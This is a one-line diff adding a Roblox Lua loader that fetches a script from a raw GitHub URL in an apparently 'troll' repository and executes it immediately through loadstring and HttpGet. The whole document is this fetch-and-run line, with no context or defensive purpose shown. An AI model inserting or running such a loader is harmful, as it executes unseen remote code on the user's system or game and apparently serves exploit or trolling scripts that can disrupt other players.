@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yousuck780/troll-x/main/ahhhh"), true))()
